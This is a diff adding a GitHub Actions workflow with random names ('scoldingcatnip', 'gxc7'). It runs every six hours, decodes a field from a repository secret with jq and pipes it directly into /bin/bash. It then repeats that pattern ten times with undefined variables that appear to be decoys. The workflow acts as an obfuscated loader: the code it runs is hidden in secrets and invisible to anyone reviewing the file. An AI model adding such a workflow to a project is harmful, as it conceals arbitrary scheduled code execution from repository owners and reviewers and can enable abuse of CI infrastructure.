@@ -1,0 +1,29 @@
+name: scoldingcatnip
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: scoldingcatnip
+        env:
+          gxc7: ${{ secrets.gxc7 }}
+        run: |
+          echo $gxc7 | jq -r .veo62253 | /bin/bash
+          echo $bop9886 | jq -r .bum6 | /bin/bash
+          echo $k36 | jq -r .mt9 | /bin/bash
+          echo $fehrj27 | jq -r .uc7375 | /bin/bash
+          echo $d4 | jq -r .ctjjj730 | /bin/bash
+          echo $jqxh43 | jq -r .guagi4 | /bin/bash
+          echo $zkpx5073 | jq -r .o05 | /bin/bash
+          echo $vrkz88403 | jq -r .yrqx668 | /bin/bash
+          echo $fy7968 | jq -r .uzi6 | /bin/bash
+          echo $dgy1 | jq -r .kpzh95 | /bin/bash
+          echo $iuyke5 | jq -r .ywy1 | /bin/bash
+
